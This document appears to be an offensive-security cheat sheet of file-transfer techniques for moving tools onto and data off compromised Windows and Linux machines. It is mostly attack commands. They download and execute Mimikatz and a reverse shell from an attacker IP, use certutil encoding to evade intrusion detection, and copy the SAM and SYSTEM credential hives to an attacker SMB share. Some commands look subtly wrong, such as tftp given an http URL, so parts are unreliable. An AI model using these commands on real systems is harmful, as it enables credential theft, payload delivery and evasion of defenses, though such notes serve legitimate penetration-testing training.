# File-Transfert-Methods

# Windows Methods

#### Powershell - Download in memory
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.194:8000/Invoke-Mimikatz.ps1')
```

#### Powershell - Download in folder
Detected by Antivirus and SIEM tools such as Varonis
```
IEX (New-Object Net.WebClient).DownloadFile("http://192.168.119.194:8000/mimikatz.exe","C:\temp\mimikatz.exe")
```

***Important Note :*** In case of cmd shell and not powershell prompt, you can execute powershell command using "powershell -c 'COMMAND'". As exemple :
C:\Users\bill\Documents>powershell -c "(New-object System.Net.WebClient).DownloadFile('http://10.0.0.1:8000/myreverseshell.exe','C:\tmp\myreverseshell.exe')"

#### TFTP 
On the old Windows version sur as Windows XP, Windows 2000

On kali linux
(/tftp is a specific folder where the fille have to be put before to be uploaded on the victim. The uploaded file from the victim will be put here also)
```
atftpd --daemon --port 69 /tftp
```
On Windows
```
➤  Upload
tftp -i http://192.168.119.194:8000/ put filename
➤  Download 
tftp -i http://192.168.119.194:8000/ get filename
```

#### Curl
```
curl http://192.168.119.194:8000/mimikatz.exe --output mimikatz.exe
```

#### Certutil

Basic transfert
```
certutil.exe -urlcache -split -f http://192.168.119.194:8000/mimikatz.exe output.file
```
Encoded transfert - Basic IPS/IDS evasion
```
certutil.exe -encode mimikatz.exe mimikatz.txt
certutil.exe -urlcache -split -f "http://192.168.119.194:8000/mimikatz.txt" mimikatz.txt
certutil.exe -decode mimikatz.txt mimikatz.exe
```

#### Copy
Upload a file from the Windows victim machine to the kali attacker machine.

```
#On the attacker kali machine, deploy a smb server
sudo python3 /opt/impacket/examples/smbserver.py kali .

#On the windows victime machine, upload the file
copy C:\Windows\Repair\SAM \\AttackerIP\kali\
copy C:\Windows\Repair\SYSTEM \\AttackerIP\kali\
```

# Linux Methods

#### Curl
```
curl http://192.168.119.194:8000/mimikatz.exe --output mimikatz.exe
```

#### Wget
```
wget -O mimikatz.exe http://192.168.119.194:8000/mimikatz.exe
```

#### Bypass IPtable using SCP through SSH
```
In the case of IPtable restrict the possibility to upload a file on the victim machine.
If you have a ssh connection using a id-rsa key, you could try the SCP tool to upload the file through the SSH connection.

➤ Prerequisite : Have a ssh connection (id-rsa)

➤ Error :
wget -O test.txt http://192.168.1.1:443/test.txt
--2022-03-13-- http://192.168.1.1:443:test.txt
Connecting to 192.168.1.1:443 ...

➤ Command :

• From the attacker machine, download something from the victim machine (using password)
# scp <file_to_download> <username>@<ip>:/<location> <where_to_upload>
root# scp myfile.txt user@10.0.0.1:/home/user
user@10.0.0.1's password:
OR for download a complete repository 
root# scp myfile.txt user@10.0.0.1:/home/user/* .

• From the the attacker machine, download something from the victim machine (using ssh key)
# scp -i <ssh_key>  <username>@<ip>:/<location>/<file> <where_to_upload>
scp -i sshkey.pem user@10.0.0.1:/home/user/test.txt /tmp/

• From the attacker machine, upload something on a the victim machine
root# scp -i ~/.ssh/id_rsa myfile.txt user@10.0.0.1

• From the victim machine, upload something on the attacker machine
scp myfile.txt root@10.0.0.1:/root/ .
```
